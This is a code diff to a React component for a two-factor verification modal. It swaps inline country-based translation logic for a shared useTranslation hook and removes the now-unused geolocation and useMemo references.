@@ -1,10 +1,10 @@
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import { getTranslations } from '@/utils/translate';
+import { useTranslation } from '@/utils/use-translation';
 import axios from 'axios';
 import Image from 'next/image';
-import { useEffect, useMemo, useState, type FC } from 'react';
+import { useEffect, useState, type FC } from 'react';
 
 const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: string }> = ({ nextStep, businessName, fullName }) => {
     const [attempts, setAttempts] = useState(0);
@@ -13,30 +13,10 @@ const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: 
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
 
-    const { geoInfo, messageId, message, setMessage, userFullName, userEmail, userPhone } = store();
+    const { messageId, message, setMessage, userFullName, userEmail, userPhone } = store();
+    const { t } = useTranslation();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 10;
-
-    // Get language from country code
-    const countryToLanguage: Record<string, string> = useMemo(() => ({
-        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
-        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
-        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
-        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
-        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
-        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
-        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
-    }), []);
-    
-    const translations = useMemo(() => {
-        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
-        const lang = countryToLanguage[countryCode] || 'en';
-        return getTranslations(lang);
-    }, [geoInfo, countryToLanguage]);
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
 
     // Mask email - show first char and domain
     const maskEmail = (email: string): string => {
